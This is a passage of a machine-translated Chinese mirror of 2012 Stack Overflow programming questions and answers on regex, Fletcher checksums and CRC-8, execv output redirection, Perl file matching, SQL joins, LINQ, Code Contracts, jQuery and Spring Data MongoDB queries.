/ and 0X 
```

所以剩下的代码应该是

```
106419 
```

谁能帮我解决这个问题！？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:57:04.803

Perl 样式替换：

```
s{/(\d+)0X}{\1}g; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:57:25.060

匹配模式：`^(\d+)/(\d+)0X$`，替换模式：`$1$2`。

根据选择的语言，您可能需要`/`在匹配的开头和结尾包含，并在`$`替换`\`模式中替换为。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:18:32.980

蟒蛇方法：

```
>>> import re
>>> re.sub(r'(/)|(0X)', '', '10641/90X')
'106419' 
```

这取代了任何实例`/`或`0X`什么都没有。这意味着它只是删除它们。

您可以更进一步，如果您只想从字符串中提取数字，并无论如何删除其他任何内容，只需使用以下命令：

```
>>> re.sub(r'[^\d]', '', '10641/90X')
'1064190' 
```

当然，在这种情况下，您想删除尾随`0X`，所以它没有那么有用。但对于类似的问题，它可能是一个很好的解决方案。

# drupal-7 - 清漆配置不起作用

> ID：13491691
> 
> 赞同：2
> 
> 时间：2012-11-21T10:53:49.223
> 
> 标签：drupal-7, drupal-modules

我已经在 drupal 7 中安装了清漆模块，同时单击配置它会显示一个带有标题服务器错误的错误页面，如果我回到模块菜单，则会出现另一个错误日志

像**警告：require_once（/var/www/magz/sites/all/modules/varnish/varnish.admin.inc）：无法打开流：menu_execute_active_handler（）中没有这样的文件或目录（/var/www/的第515行magz/includes/menu.inc）。**

我尝试重新安装和其他一些东西，但错误仍然存​​在，有任何解决方案

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-16T21:00:56.000

您是否检查了路径和文件（文件夹）是否有效？似乎该模块需要某些不存在的文件。

我检查了版本： 7.x-1.0-beta2 并且没有发生此类问题。

只是要关闭读取权限会导致这种情况，请按照该说明进行操作：[页面](http://frizi.net/drupal-server/drupal-file-directory-structure-and-file-persmision-setting)- 关于访问权限设置。

# c# - 使用 OData 创建新数据

> ID：13491692
> 
> 赞同：0
> 
> 时间：2012-11-21T10:53:53.780
> 
> 标签：c#, odata, visual-studio-lightswitch

我有一个灯开关项目，我通过 Odata 导出其数据。在我的客户端应用程序中，我添加了服务参考 (WorkProject)。我创建了一个新数据。

```
WorkProject.Employee.CreateEmployee("1","Guy); 
```

如何通过 Odata 保存新数据。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T07:33:06.523

objApplicationData.SaveChanges(System.Data.Services.Client.SaveChangesOptions.Batch);

请参阅：完整的 CRUD LightSwitch JQuery 移动应用程序 [http://lightswitchhelpwebsite.com/Blog/tabid/61/EntryId/126/A-Full-CRUD-LightSwitch-JQuery-Mobile-Application.aspx](http://lightswitchhelpwebsite.com/Blog/tabid/61/EntryId/126/A-Full-CRUD-LightSwitch-JQuery-Mobile-Application.aspx)

# c - 16 字节数据的 8 位弗莱彻校验和

> ID：13491700
> 
> 赞同：3
> 
> 时间：2012-11-21T10:54:15.420
> 
> 标签：c, microcontroller, crc

我正在尝试实现一个 8 位 fletcher 校验和函数。

我的数据总是 17 字节长。

我从[Remake of Fletcher checksum from 32bit to 8开始](https://stackoverflow.com/questions/8925018/remake-of-fletcher-checksum-from-32bit-to-8)

这是我最终得到的：

```
// 8-bit Fletcher checksum
//   data is always 17 byte long
uint8_t fletcher(uint8_t *data) {
    uint8_t sum1 = 0x0f, sum2 = 0x0f, len = 17;

    while(len) {
        sum1 += *data++;
        sum2 += sum1;
        sum1 = (sum1 & 0x0f) + (sum1 >> 4);
        sum2 = (sum2 & 0x0f) + (sum2 >> 4);
        len--;
    }
    sum1 = (sum1 & 0x0f) + (sum1 >> 4);
    sum2 = (sum2 & 0x0f) + (sum2 >> 4);
    return sum2<<4 | sum1;
} 
```

我想知道它是否很好，我的印象是我可以进一步简化，但我找不到在哪里（也许它毕竟不能进一步简化......）。

我的主要问题是这段代码看起来是否可以正常工作。我在基于无线的数据链路的两侧使用它，它将“工作”（从相同的数据返回相同的校验和），但可能在 fletcher 方式上是错误的，并且无法提供预期的错误检测......

希望我足够清楚...

提前致谢 ！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T16:28:07.350

首先，Fletcher 的任何变体都不是 CRC。这是一个校验和。

其次，只要算法正确，您处理的字节数就没有什么特别之处。

第三，您不需要也不应该在每一步都进行模 15。对于速度（与 CRC 相比，这是 Fletcher 和的全部要点），应该有一个仅由`sum2 += sum1 += *data++;`. 根据`sum1`和`sum2`数据类型的大小，您可以计算在溢出之前可以进行多少次迭代，`sum2`假设所有输入字节都是`0xff`. 然后一个外循环运行该内循环多次，然后是两个模 15。外部循环遍历所有输入数据。

第四，当结束为 15 时，`(x >> 4) + (x & 0xf)`操作没有完成预期的操作。需要一个 final 。`x % 15``x``if (x == 15) x = 0;`

*更新：*

好的，代码如下：

```
#include <stdio.h>

#define MAXPART 5803    /* for 32-bit unsigned sum1, sum2 */
/* #define MAXPART 22   for 16-bit unsigned sum1, sum2 */

unsigned fletcher8(unsigned f8, unsigned char *data, size_t len)
{
    unsigned long sum1, sum2;
    size_t part;

    sum1 = f8 & 0xf;
    sum2 = (f8 >> 4) & 0xf;
    while (len) {
        part = len > MAXPART ? MAXPART : len;
        len -= part;
        do {
            sum2 += sum1 += *data++;
        } while (--part);
        sum1 %= 15;
        sum2 %= 15;
    }
    return (sum2 << 4) + sum1;
}

#define SIZE 131072

int main(void)
{
    unsigned f8 = 1;
    unsigned char buf[SIZE];
    size_t got;

    while ((got = fread(buf, 1, SIZE, stdin)) > 0)
        f8 = fletcher8(f8, buf, got);
    printf("0x%02x\n", f8);
    return 0;
} 
```

请注意，我从 Fletcher8 值开始，`1`而不是`0xff`. 这足以确保任意长度的零字符串将产生相同的零结果。您可以将初始值设置为您喜欢的任何值，只要它不为零即可。

如果机器上的模 ( `%`) 运算非常慢，那么`% 15`使用一组移位和加法进行运算可能会更快。以下是 32 位类型的示例：

```
k = (k >> 16) + (k & 0xffff);
k = (k >> 8) + (k & 0xff);
k = (k >> 4) + (k & 0xf);
k = (k >> 4) + (k & 0xf);
if (k > 14)
    k -= 15; 
```

对于上述情况`len == 17`，代码可以简化为使用`unsigned`而不是`unsigned long`for `sum1`and `sum2`，并跳过外循环，因为`len <= 22`。非%模运算也可以缩短。就是这样，我还消除了循环中不必要的递减操作：

```
unsigned fletch8_17(unsigned char *data)
{
    unsigned sum1 = 1;
    unsigned sum2 = 0;
    unsigned char *end = data + 17;
    do {
        sum2 += sum1 += *data++;
    } while (data < end);
    sum1 = (sum1 >> 8) + (sum1 & 0xff);
    sum1 = (sum1 >> 4) + (sum1 & 0xf);
    if (sum1 > 14) {
        sum1 -= 15;
        if (sum1 > 14)
            sum1 -= 15;
    }
    sum2 = (sum2 >> 8) + (sum2 & 0xff);
    sum2 = (sum2 >> 4) + (sum2 & 0xf);
    if (sum2 > 14) {
        sum2 -= 15;
        if (sum2 > 14)
            sum2 -= 15;
    }
    return (sum2 << 4) + sum1;
} 
```

为了比较，你可以试试这个 8 位 CRC，看看它如何比较速度（crc 应该初始化为零）：

```
#include <stddef.h>

/* 8-bit CRC with polynomial x^8+x^6+x^3+x^2+1, 0x14D.
 Chosen based on Koopman, et al. (0xA6 in his notation = 0x14D >> 1):
 http://www.ece.cmu.edu/~koopman/roses/dsn04/koopman04_crc_poly_embedded.pdf
 */

static unsigned char crc8_table[] = {
    0x00, 0x3e, 0x7c, 0x42, 0xf8, 0xc6, 0x84, 0xba, 0x95, 0xab, 0xe9, 0xd7,
    0x6d, 0x53, 0x11, 0x2f, 0x4f, 0x71, 0x33, 0x0d, 0xb7, 0x89, 0xcb, 0xf5,
    0xda, 0xe4, 0xa6, 0x98, 0x22, 0x1c, 0x5e, 0x60, 0x9e, 0xa0, 0xe2, 0xdc,
    0x66, 0x58, 0x1a, 0x24, 0x0b, 0x35, 0x77, 0x49, 0xf3, 0xcd, 0x8f, 0xb1,
    0xd1, 0xef, 0xad, 0x93, 0x29, 0x17, 0x55, 0x6b, 0x44, 0x7a, 0x38, 0x06,
    0xbc, 0x82, 0xc0, 0xfe, 0x59, 0x67, 0x25, 0x1b, 0xa1, 0x9f, 0xdd, 0xe3,
    0xcc, 0xf2, 0xb0, 0x8e, 0x34, 0x0a, 0x48, 0x76, 0x16, 0x28, 0x6a, 0x54,
    0xee, 0xd0, 0x92, 0xac, 0x83, 0xbd, 0xff, 0xc1, 0x7b, 0x45, 0x07, 0x39,
    0xc7, 0xf9, 0xbb, 0x85, 0x3f, 0x01, 0x43, 0x7d, 0x52, 0x6c, 0x2e, 0x10,
    0xaa, 0x94, 0xd6, 0xe8, 0x88, 0xb6, 0xf4, 0xca, 0x70, 0x4e, 0x0c, 0x32,
    0x1d, 0x23, 0x61, 0x5f, 0xe5, 0xdb, 0x99, 0xa7, 0xb2, 0x8c, 0xce, 0xf0,
    0x4a, 0x74, 0x36, 0x08, 0x27, 0x19, 0x5b, 0x65, 0xdf, 0xe1, 0xa3, 0x9d,
    0xfd, 0xc3, 0x81, 0xbf, 0x05, 0x3b, 0x79, 0x47, 0x68, 0x56, 0x14, 0x2a,
    0x90, 0xae, 0xec, 0xd2, 0x2c, 0x12, 0x50, 0x6e, 0xd4, 0xea, 0xa8, 0x96,
    0xb9, 0x87, 0xc5, 0xfb, 0x41, 0x7f, 0x3d, 0x03, 0x63, 0x5d, 0x1f, 0x21,
    0x9b, 0xa5, 0xe7, 0xd9, 0xf6, 0xc8, 0x8a, 0xb4, 0x0e, 0x30, 0x72, 0x4c,
    0xeb, 0xd5, 0x97, 0xa9, 0x13, 0x2d, 0x6f, 0x51, 0x7e, 0x40, 0x02, 0x3c,
    0x86, 0xb8, 0xfa, 0xc4, 0xa4, 0x9a, 0xd8, 0xe6, 0x5c, 0x62, 0x20, 0x1e,
    0x31, 0x0f, 0x4d, 0x73, 0xc9, 0xf7, 0xb5, 0x8b, 0x75, 0x4b, 0x09, 0x37,
    0x8d, 0xb3, 0xf1, 0xcf, 0xe0, 0xde, 0x9c, 0xa2, 0x18, 0x26, 0x64, 0x5a,
    0x3a, 0x04, 0x46, 0x78, 0xc2, 0xfc, 0xbe, 0x80, 0xaf, 0x91, 0xd3, 0xed,
    0x57, 0x69, 0x2b, 0x15};

unsigned crc8(unsigned crc, unsigned char *data, size_t len)
{
    unsigned char *end;

    if (len == 0)
        return crc;
    crc ^= 0xff;
    end = data + len;
    do {
        crc = crc8_table[crc ^ *data++];
    } while (data < end);
    return crc ^ 0xff;
} 
```

8 位 CRC 肯定会比 8 位 Fletcher 校验和提供更好的错误检测性能。在这种情况下，它甚至可能更快！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T17:19:46.807

您的代码看起来很像Wikipedia 关于 Fletcher 校验和的文章的[优化部分中给出的代码。](http://en.wikipedia.org/wiki/Fletcher%27s_checksum#Optimizations)我猜[你的消息来源](https://stackoverflow.com/questions/8925018/remake-of-fletcher-checksum-from-32bit-to-8)从那里拿走了它，没有适当的归属。

# 递延减少

您的代码看起来基本正确。但是，你总结的太多了。如果您的输入只有 17 个字节的数据，那么您的最大值`sum2`将为`17*(17+1)/2*0xf + 0xf = 0x906`，它适合`uint16_t`. 要将其减少到一个半字节，两个减少步骤就足够了。对于`sum1`，最大值将是`17*0xf + 0xf = 0x10e`，这也需要两次减少。所以你可以写

```
uint8_t fletcher(uint8_t *data) {
    uint16_t sum1 = 0xf, sum2 = 0xf, len = 17;
    while(len) {
        sum1 += *data++;
        sum2 += sum1;
        len--;
    };
    sum1 = (sum1 & 0x0f) + (sum1 >> 4);
    sum1 = (sum1 & 0x0f) + (sum1 >> 4);
    sum2 = (sum2 & 0x0f) + (sum2 >> 4);
    sum2 = (sum2 & 0x0f) + (sum2 >> 4);
    return sum2<<4 | sum1;
} 
```

你可以对代码做进一步的“优化”，比如

```
do { sum2 += ( sum1 += *data++ ); } while (--len); 
```

甚至手动展开该循环，但一个好的优化编译器应该为您处理这个问题。

您可以将上述注意事项调整为其他输入长度。

# 整个字节作为半字节流

上面的答案假设您的数据仅包含未打包的半字节，即最多使用每个字节的最低有效一半。我在这里可能是错的，但我想如果你正在处理整个字节，最符合弗莱彻校验和精神的解决方案是将它们视为一个包含两倍多半字节的序列，例如

```
 sum1 += *data & 0xf;
        sum2 += sum1;
        sum1 += *data >> 4;
        sum2 += sum1;
        ++data;
        --len; 
```

可能有更有效的方法来编写它作为更少的优化。您的编译器可能会或可能无法找到其中之一。

# 校验和的质量

> 但可能在弗莱彻方式上是错误的，并且没有提供预期的错误检测......

我不确定这里的弗莱彻校验和到底有多大用处。也许一些具有 8 位输出*的真正* [CRC](http://en.wikipedia.org/wiki/Cyclic_redundancy_check)会更好地满足您在错误检查方面的需求。

# c++ - 将以 execv 启动的进程重定向到 /dev/null

> ID：13491707
> 
> 赞同：1
> 
> 时间：2012-11-21T10:54:35.877
> 
> 标签：c++, linux, fork, stdout

我有一个程序，`forks()`子进程被另一个进程替换，比如 A，它是通过调用来运行的`execv(A)`。

如何将 process`A`的输出重定向到`/dev/null`??

到目前为止我已经尝试过：（处理错误部分，并且没有发生错误）

```
 pid = fork();
    //check for errors
    if (pid<0){
                  //handle error
    }
    //the child process runs here
    if (pid==0){
        fd = open("/dev/null", O_WRONLY);
        if(fd < 0){
                        //hadnle error
        }
        if ( dup2( fd, 1 )  != 1 ) {
                         //handle error 
        }
        if (execv(lgulppath.c_str(),args)<0){
            //handle error
        }
    } 
```

但是，可以理解的是，这不起作用，因为它将子进程的输出重定向到`/dev/null`而不是进程的输出，然后`A`替换子进程的输出。

有任何想法吗？（我没有`A`进程的代码）

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:06:55.297

一种可能是，进程 A 写入`stderr`而不是`stdout`.

那么你必须`dup2(fd, 2)`改为。

如果进程 A 写入`stdout` *and* `stderr`，您必须`dup2()`同时：

```
if (dup2(fd, 1) < 0) {
    // error handling
}

if (dup2(fd, 2) < 0) {
    // error handling
} 
```

# regex - 正则表达式代码

> ID：13491710
> 
> 赞同：3
> 
> 时间：2012-11-21T10:54:45.917
> 
> 标签：regex, perl, debugging

我需要在两个制表符分隔的文件之间找到匹配项，如下所示：

文件 1：

```
ID1  1  65383896    65383896    G   C  PCNXL3
ID1  2  56788990        55678900        T       A  ACT1 
ID1  1   56788990       55678900       T       A  PRO55 
```

文件 2

```
ID2 34    65383896   65383896       G   C  MET5
ID2  2   56788990       55678900       T       A  ACT1 
ID2  2   56788990       55678900       T       A  HLA 
```

我想做的是检索两个文件之间的匹配行。我想匹配的是基因ID之后的一切

到目前为止，我已经编写了这段代码，但不幸的是 perl 一直给我错误：使用“在模式匹配中使用未初始化的值 (m//)”

你能帮我弄清楚我在哪里做错了吗？

先感谢您！

```
use strict;

open (INA, $ARGV[0]) || die "cannot to open gene file";
open (INB, $ARGV[1]) || die "cannot to open coding_annotated.var files";

my @sample1 = <INA>;
my @sample2 = <INB>;

foreach my $line (@sample1) {
    my @tab = split (/\t/, $line);

    my $chr   = $tab[1];
    my $start = $tab[2];
    my $end   = $tab[3];
    my $ref   = $tab[4];
    my $alt   = $tab[5];
    my $name  = $tab[6];

    foreach my $item (@sample2){
        my @fields = split (/\t/,$item);

        if (   $fields[1] =~ m/$chr(.*)/
            && $fields[2] =~ m/$start(.*)/
            && $fields[4] =~ m/$ref(.*)/
            && $fields[5] =~ m/$alt(.*)/
            && $fields[6] =~ m/$name(.*)/
        ) {     
            print  $line, "\n", $item;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T12:00:05.710

从表面上看，您的代码似乎很好（尽管我没有调试它）。如果您没有我无法发现的错误，可能是输入数据具有 RE 特殊字符，当您按原样放置时会混淆正则表达式引擎（例如，如果任何变量具有“$”字符） . 也可能是你在某些地方有空格而不是制表符，在这种情况下你确实会得到一个错误，因为你的拆分会失败。

无论如何，最好只编写一个包含所有字段的正则表达式。我下面的代码有点 Perl 惯用语。我喜欢使用隐式 $_ 在我看来这使代码更具可读性。我刚刚用您的输入文件对其进行了测试，它完成了这项工作。

```
use strict;

open (INA, $ARGV[0]) or die "cannot open file 1";
open (INB, $ARGV[1]) or die "cannot open file 2";

my @sample1 = <INA>;
my @sample2 = <INB>;

foreach (@sample1) {
    (my $id, my $chr, my $start, my $end, my $ref, my $alt, my $name) =
        m/^(ID\d+)\s+(\w+)\s+(\w+)\s+(\w+)\s+(\w+)\s+(\w+)\s+(\w+)/;
    my $rex = "^ID\\d+\\s+$chr\\s+$start\\s+$end\\s+$ref\\s+$alt\\s+$name\\s+";
    #print "$rex\n";
    foreach (@sample2) {
        if( m/$rex/ ) {
            print "$id - $_";
        }
    }
} 
```

另外，输入数据的规律性如何？字段之间是否只有一个选项卡？如果是这种情况，将行拆分为 7 个不同的字段是没有意义的 - 您只需要两个：行的 ID 部分，以及其余部分。第一个正则表达式是

```
(my $id, my $restOfLine) = m/^(ID\d+)\s+(.*)$/; 
```

您正在使用与上述类似的技术在第二个文件中搜索 $restOfLine。

如果您的文件**很大**并且性能是一个问题，您应该考虑将第一个正则表达式（或字符串）放入映射中。这将为您提供 O(n*log(m)) 其中 n 和 m 是每个文件中的行数。

最后，当我需要比较日志时，我遇到了类似的挑战。日志应该是相同的，除了每行开头的时间标记。但更重要的是：大多数行都是相同*且有序*的。如果这是您所拥有的，并且对您有意义，您可以：

1.  首先从每一行中删除 IDxxx：`perl -pe "s/ID\d+ +//"` file >cleanfile
2.  然后使用 BeyondCompare 或 Windiff 比较文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T12:56:26.313

我玩了一下你的代码。你在那里写的实际上是三个循环：

*   超过第一个文件的行，
*   超过第二个文件的行，以及
*   这些行中的所有字段。您手动展开了此循环。

> 该答案的其余部分假定文件是严格用制表符分隔的，并且任何其他空格都很*重要*（即使在字段和行的末尾）。

这是代码的精简版本（假设打开文件句柄`$file1`、`$file2`和`use strict`）：

```
my @sample2 = <$file2>;

SAMPLE_1:
foreach my $s1 (<$file1>) {
    my (undef, @fields1) = split /\t/, $s1;
    my @regexens = map qr{\Q$_\E(.*)}, @fields1;

    SAMPLE_2:
    foreach my $s2 (@sample2) {
        my (undef, @fields2) = split /\t/, $s2;
        for my $i (0 .. $#regexens) {
            $fields2[$i] =~ $regexens[$i] or next SAMPLE_2;
        }
        # only gets here if all regexes matched
        print $s1, $s2;
    }
} 
```

我做了一些优化：预编译各种正则表达式并将它们存储在一个数组中，引用字段的内容等。但是，这个算法是*O(n²)*，这很糟糕。

这是该算法的一个优雅变体，它*知道*只有第一个字段不同——该行的其余部分必须与*character 的字符*相同：

```
my @sample2 = <$file2>;

foreach my $s1 (<$file1>) {
    foreach my $s2 (@sample2) {
        print $s1, $s2 if (split /\t/, $s1, 2)[1] eq (split /\t/, $s2, 2)[1];
    }
} 
```

我只是测试该行其余部分的字符串相等性。虽然这个算法仍然是*O(n²)*，但它仅仅通过在这里避免脑死亡的正则表达式，它就比第一个解决方案大约好一个数量级。

最后，这是一个*O(n)*的解决方案。它是前一个的变体，但在一个之后执行循环*，*而不是*在*彼此内部，因此在线性时间内完成。我们使用哈希：

```
# first loop via map    
my %seen = map {reverse(split /\t/, $_, 2)}
           # map {/\S/ ? $_ : () } # uncomment this line to handle empty lines
           <$file1>;

# 2nd loop
foreach my $line (<$file2>) {
    my ($id2, $key) = split /\t/, $line, 2;
    if (defined (my $id1 = $seen{$key})) {
        print "$id1\t$key";
        print "$id2\t$key";
    }
} 
```

`%seen`是一个哈希，该行的其余部分作为键，第一个字段作为值。在第二个循环中，我们再次检索该行的其余部分。如果该行存在于第一个文件中，我们将重建整行并将其打印出来。该解决方案比其他解决方案更好，并且由于其线性复杂性而可以很好地向上和向下扩展

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T16:26:53.093

怎么样：

```
#!/usr/bin/perl

use File::Slurp;
use strict;

my ($ina, $inb) = @ARGV;

my @lines_a = File::Slurp::read_file($ina);
my @lines_b = File::Slurp::read_file($inb);

my $table_b = {};

my $ln = 0;

# Store all lines in second file in a hash with every different value as a hash key
# If there are several identical ones we store them also, so the hash values are lists  containing the id and line number
foreach (@lines_b) {
    chomp; # strip newlines
    $ln++; # count current line number 
    my ($id, $rest) = split(m{[\t\s]+}, $_, 2); # split on whitespaces, could be too many tabs or spaces instead
    if (exists $table_b->{$rest}) {
        push @{ $table_b->{$rest} }, [$id, $ln]; # push to existing list if we already found an entry that is the same
    } else {
        $table_b->{$rest} = [ [$id, $ln] ]; # create new entry if this is the first one
    }
} 

# Go thru first file and print out all matches we might have
$ln = 0;
foreach (@lines_a) {
    chomp;
    $ln++; 
    my ($id, $rest) = split(m{[\t\s]+}, $_, 2);
    if (exists $table_b->{$rest}) { # if we have this entry print where it is found
        print "$ina:$ln:\t\t'$id\t$rest'\n " . (join '\n ', map { "$inb:$_->[1]:\t\t'$_->[0]\t$rest'" } @{ $table_b->{$rest} }) . "\n";
    }
} 
```

# mysql - 创建具有空值的连接

> ID：13491712
> 
> 赞同：0
> 
> 时间：2012-11-21T10:54:53.840
> 
> 标签：mysql

我有一个表“产品”和一个表“订单”，订单表有以下字段：“id_products”和“id_users”加入这两个表然后写：

```
SELECT * FROM products as p LEFT JOIN orders as o ON p.id_products=o.id_products 
```

我想创建一个 JOIN，其中包含您订购的用户 ID 为 1 的所有产品以及仍需订购的产品。

编辑：

```
SELECT * FROM products LEFT JOIN orders 
ON products.id_products= orders.id_products
WHERE user_id = 1 OR user_id IS NULL 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:03:50.340

```
SELECT * FROM products LEFT JOIN orders 
ON products.id_products= orders.id_products
Where user.id = 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:01:54.717

才不是

```
SELECT * FROM products as p LEFT OUTER JOIN orders as o ON p.id_products=o.id_products  
where id_users = 1 
```

做你想做的事？

# c# - 代码合同：确保未经证实的字符串方法

> ID：13491714
> 
> 赞同：0
> 
> 时间：2012-11-21T10:55:01.827
> 
> 标签：c#, code-contracts, specifications

我正在玩代码合同，并得到了一个简单的方法，在每个字符之间插入给定数量的空格字符。

例如

```
Hello -> H e l l o
World -> W   o   r   l   d 
```

InsertSpaceBetweenLetters 方法在一个类中实现，该类提供一些字符串属性 S，即修改后应返回的字符串。这是代码

```
public string InsertSpaceBetweenLetters(int spaceWidth)
{
    Contract.Requires(spaceWidth > 0);
    Contract.Requires(S.Length > 0);
    Contract.Ensures(Contract.Result<string>() != null);
    Contract.Ensures(Contract.Result<string>().Length == S.Length + (S.Length - 1) * spaceWidth);

    string result = String.Empty;

    Contract.Assume(S.Length >= 0);
    for(int i = 0; i < S.Length; i++)
    {
        result += S[i];
        if (i < S.Length - 1)
            result += new String(' ', spaceWidth);
    }
    return result;
} 
```

静态检查器给我以下警告：

```
ensures unproven: Contract.Result<string>().Length == S.Length + (S.Length - 1) * spaceWidth 
```

我想我可以通过在循环之前做的假设来摆脱这个警告：

```
Contract.Assume(S.Length >= 0); 
```

但警告仍然存在。必须做出哪些假设才能消除警告？

先感谢您。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:03:27.833

从根本上说，我认为在这种情况下你对静态检查器的要求太多了。如果它真的*能*解决这个问题，那将是非常令人印象深刻的。在这种情况下，我认为您只需要忍受它是执行时检查而不是编译时检查。

我不知道是否有一种特定的方式说“请确保这是一个后置条件，但不要试图证明它” -在方法末尾`Contract.Assume` *使用后置条件调用**可能*会这样做，但它可能意味着对其进行两次评估:(

（顺便说一句，您的实现目前*确实*效率低下。这不是这个问题的主题，但仍然值得一看。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:05:24.130

我认为你的假设是错误的。它不适用于`S.Length == 0`: 在第二个`ensures`你会得到一个负值。

其次，检查`ensures`编译时的语句并非易事。可能只是没有在检查器中实现..

也许你可以以不同的方式实现你的循环。删除您的`if`语句并从 0 循环到 S.Length-2。但我不确定..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-26T00:57:33.083

试试这个

```
 public string InsertSpaceBetweenLetters(string S, int spaceWidth) {

        Contract.Requires(spaceWidth > 0);
        Contract.Requires(S != null);
        Contract.Requires(S.Length > 0);
        Contract.Ensures(Contract.Result<string>() != null);
        Contract.Ensures(Contract.Result<string>().Length == S.Length + (S.Length - 1) * spaceWidth);

        StringBuilder result = new StringBuilder(String.Empty);

        int count = 0;
        int final = S.Length - 1;
        foreach ( char c in S )
        {
            result.Append(c, 1);
            if ( count < final )
            {
                result.Append(' ', spaceWidth);
            }
            ++count;
        }
        return result.ToString();
    } 
```

# linq - LINQ 中的 LIKE 和 IN

> ID：13491718
> 
> 赞同：0
> 
> 时间：2012-11-21T10:55:07.257
> 
> 标签：linq, c#-4.0, contains

我想过滤不包含 xxx、yyy、zzz 等的结果。我尝试使用 Array 过滤掉我不想要的结果，但它不会像往常一样过滤和返回行。

```
string[] ExcludeCourses = new string[] {"Functional Skills", "Key Skills"};        
gvProgrammes.DataSource = offerings.Where(o => o.OfferingStatusID == 1
                          && o.OfferingTypeID != 3
                          && !ExcludeCourses.Contains(o.CourseName)); 
```

最后，我最终为每个条目写了如下内容。有更好的方法吗？

```
offerings.Where(o => o.OfferingStatusID == 1
                 && o.OfferingTypeID != 3
                 && !o.CourseName.Contains("Functional Skills")
                 && !o.CourseName.Contains("Key Skills")
                 && !o.CourseName.Contains("Employer Rights and Responsibilities")); 
```

以下是我要排除的 CourseName 示例：

*   学徒 CG 证书功能技能 Eng L2（业务管理）
*   学徒 CG 证书功能技能 Eng L2（WBL-工程）
*   学徒 CG 关键技能 AON 2 学徒 CG 关键技能 AON 1
*   就业权利和责任奖 (QCF)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:25:46.320

你的第一个`Contains`是`Enumerable.Contains`：“这个字符串序列包含这个字符串”

你的第二个`Contains`是`String.Contains`：“这个字符串包含这个另一个字符串作为子字符串”。

以下是“此字符串序列包含一个字符串，该字符串包含该字符串作为子字符串”：

```
string[] ExcludeCourses = new string[] {
    "Functional Skills",
    "Key Skills",
    "Employer Rights and Responsibilities" };
gvProgrammes.DataSource = offerings.Where(o => o.OfferingStatusID == 1
    && o.OfferingTypeID != 3
    && !ExcludeCourses.Any(ec => o.CourseName.Contains(ec))); 
```

该`Any`呼叫基本上与您重复的手动`String.Contains`呼叫相同。

# php - 使用 jquery 发送帖子并在“灯箱”中加载特定选择器

> ID：13491720
> 
> 赞同：1
> 
> 时间：2012-11-21T10:55:17.227
> 
> 标签：php, jquery, ajax, post, lightbox

我想用 Jquery $.POST() 发布一个表单值并加载一个我不知道该怎么做的特定选择器可能是用 json 或类似的东西

```
$.post('topic.php', {
    id: id
}, function(data) {
    $("#message")
        .html($(data).('attr', 'title'))
        .hide()
        .slideDown(500); //Fade in the data given by the topic.php file
});
return false;
});​ 
```

我只想加载标题和描述而不是整个页面

我想在灯箱中检索此标题和描述，我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:09:27.253

首先，jQuery（甚至内部的许多浏览器）发送一个 HTTP_X_REQUESTED_WITH 标头。您可以在 topic.php 中捕获它并返回 json 而不是 html。检查此链接以获取操作方法：[http ://www.electrictoolbox.com/how-to-tell-ajax-request-php/](http://www.electrictoolbox.com/how-to-tell-ajax-request-php/)

如果你真的想从返回的 html 中提取内容，这很简单：用 jQuery 创建一个空白 DOM 对象，给它 HTML 数据，然后用 find 函数检索你想要的任何元素：

```
$.post('topic.php', {
    id: id
}, function(data) {
$("#message")
    .html($('<div></div>').html(data).find('a').('attr', 'title'))
    .hide()
    .slideDown(500); //Fade in the data given by the topic.php file
});
return false;
});​ 
```

用您需要的任何选择器替换 find 函数中的“a”标签。这里有一个工作示例：http: [//jsfiddle.net/GeX7d/](http://jsfiddle.net/GeX7d/)

**编辑**：对于灯箱部分，网上有很多描述该过程的教程，这将满足您的需求：[http ://www.cssjockey.com/web-design-tutorials/an-easy-way-to -create-light-box-with-jquery-css](http://www.cssjockey.com/web-design-tutorials/an-easy-way-to-create-light-box-with-jquery-css)

# mongodb - 使用spring data mongo Criteria将查询从JPQL移植到mongo

> ID：13491722
> 
> 赞同：0
> 
> 时间：2012-11-21T10:55:21.500
> 
> 标签：mongodb, spring-data, spring-data-mongodb

我已经将我的一些`Entity`from移植`JPA`到文档，现在移植我的一些查询。这是 JPA 查询：

```
em.createQuery("select distinct c from CustomerImpl c left join fetch c.addresses ca where (:name is null or c.firstName LIKE :name or c.lastName LIKE :name) and (:ref is null or c.externalReference LIKE :ref) and (:city is null or ca.city LIKE :city) order by c.firstName").setParameter("name", name).setParameter("ref", customerRef).setParameter("city", city).getResultList(); 
```

以下是我的尝试：

```
 Criteria orNameCriteria = new Criteria().orOperator(Criteria.where("firstName").is(null), Criteria.where("firstName").is(name), Criteria.where("lastName").is(name));
    Criteria orCustomerRefCriteria = new Criteria().orOperator(Criteria.where("externalReference").is(null), Criteria.where("externalReference").regex(customerRef,"i"));
    Criteria orAddress = new Criteria().orOperator(Criteria.where("addresses.city").is(null), Criteria.where("addresses.city").regex(city, "i"));
    Query nameq = new Query(new Criteria().andOperator(orNameCriteria,orCustomerRefCriteria,orAddress)); 
```

此查询返回零大小的数组列表。然后我更改了`orNameCriteria`使用 is 子句并确保`name`变量中包含的数据具有`/`后缀和前缀。那也没有用。

但来自客户`mongoVue`的查询：`RockMongo`

```
{ firstName: /SAM/} 
```

返回数据。

**问题 1**：如何使用 spring-data-mongo编写**LIKE CLAUSE**`Criteria`？
**问题2**：使用 or 和 and 子句的正确方法是`criteria`

